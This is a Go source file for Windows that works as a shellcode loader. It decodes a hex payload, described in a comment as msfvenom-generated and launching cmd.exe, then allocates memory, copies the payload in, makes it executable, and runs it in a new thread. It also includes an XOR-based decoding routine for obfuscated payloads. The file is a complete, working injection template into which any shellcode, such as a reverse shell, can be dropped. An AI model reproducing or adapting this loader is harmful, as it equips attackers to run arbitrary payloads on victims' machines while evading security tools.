package main

import (
    "encoding/hex"
    "flag"
    "fmt"
    "log"
    "syscall"
    "unsafe"

    "golang.org/x/sys/windows"
)

var (
    kernel32            = syscall.MustLoadDLL("kernel32.dll")
    ntdll               = syscall.MustLoadDLL("ntdll.dll")
    VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
    RtlMoveMemory       = ntdll.MustFindProc("RtlMoveMemory")
    VirtualProtect      = kernel32.MustFindProc("VirtualProtect")
    CreateThread        = kernel32.MustFindProc("CreateThread")
    WaitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")
)

const (
    MEM_COMMIT        = 0x1000
    MEM_RESERVE       = 0x2000
    PAGE_EXECUTE_READ = 0x20
    PAGE_READWRITE    = 0x04
)

func getLastError() error {
    return fmt.Errorf("error code: %d", windows.GetLastError())
}

func decodeProgram(program []byte) []byte {
        decoded := make([]byte, len(program))
        for i := 0; i < len(program); i++ {

                decoded[i] = program[i] ^ 0xDD
                decoded[i] = (decoded[i] - 13) & 0xFF
        }

        return decoded

}

func allocateAndMove(debug *bool, verbose *bool, shellcode []byte) uintptr {
    if *debug {
        fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode")
    }

    size := uintptr(len(shellcode))
    addr, _, _ := VirtualAlloc.Call(
        0,                       // lpAddress (0 means let the system choose)
        size,                    // dwSize (size of the block to allocate)
        MEM_COMMIT|MEM_RESERVE,  // flAllocationType (commit and reserve memory)
        PAGE_READWRITE,          // flProtect (read/write access)
    )

    if addr == 0 {
        log.Fatalf("[!]VirtualAlloc failed: %v", getLastError())
    }

    if *verbose {
        fmt.Printf("[-] Allocated %d bytes at address %v\n", len(shellcode), addr)
    }

    if *debug {
        fmt.Println("[DEBUG] Moving shellcode to memory with RtlMoveMemory")
    }

    _, _, errRtlMoveMemory := RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

    if errRtlMoveMemory != nil && errRtlMoveMemory.Error() != "The operation completed successfully." {
            log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlMoveMemory.Error()))
    }

    return addr
}

func main() {
    verbose := flag.Bool("verbose", true, "Enable verbose output")
    debug := flag.Bool("debug", true, "Enable debug output")
    flag.Parse()

    // Shellcode
    // Default is msfvenom created cmd.exe without any encoding
    encoded, err := hex.DecodeString("fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5636d642e65786500")
    if err != nil {
        log.Fatalf("[!] Error decoding hex string: %v", err)
    }

    // if encoding is applied uncomment below
    //shellcode := decodeProgram(encoded)
    shellcode := encoded

    fmt.Printf("Decoded shellcode length: %d\n", len(shellcode))

    addr := allocateAndMove(debug, verbose, shellcode)

    if *verbose {
            fmt.Println("[-]Shellcode moved to memory")
    }
    if *debug {
            fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ")
    }

    var oldProtect uint32
    result, _, _ := VirtualProtect.Call(
        addr,
        uintptr(len(shellcode)),
        PAGE_EXECUTE_READ,
        uintptr(unsafe.Pointer(&oldProtect)),
    )

    if result == 0 {
        log.Fatalf("[!] Error calling VirtualProtect: %v", getLastError())
    }

    if *verbose {
        fmt.Println("[-] Shellcode memory region changed to PAGE_EXECUTE_READ")
    }

    if *debug {
        fmt.Println("[DEBUG] Calling CreateThread...")
    }

    thread, _, errCreateThread := CreateThread.Call(0, 0, addr, 0, 0, 0)

    if errCreateThread != nil && errCreateThread.Error() != "The operation completed successfully." {
            log.Fatal(fmt.Sprintf("[!]Error calling CreateThread:\r\n%s", errCreateThread.Error()))
    }
    if *verbose {
            fmt.Println("[+]Shellcode Executed")
    }

    if *debug {
            fmt.Println("[DEBUG]Calling WaitForSingleObject...")
    }
    handle := syscall.Handle(thread)
    event, _, errWaitForSingleObject := WaitForSingleObject.Call(uintptr(handle), 0xFFFFFFFF)

    if errWaitForSingleObject != nil {
            log.Fatal(fmt.Sprintf("[!]Error calling WaitForSingleObject:\r\n:%s", errWaitForSingleObject.Error()))
    }
    if *verbose {
            fmt.Println(fmt.Sprintf("[-]WaitForSingleObject returned with %d", event))
    }
    /*
    */
}
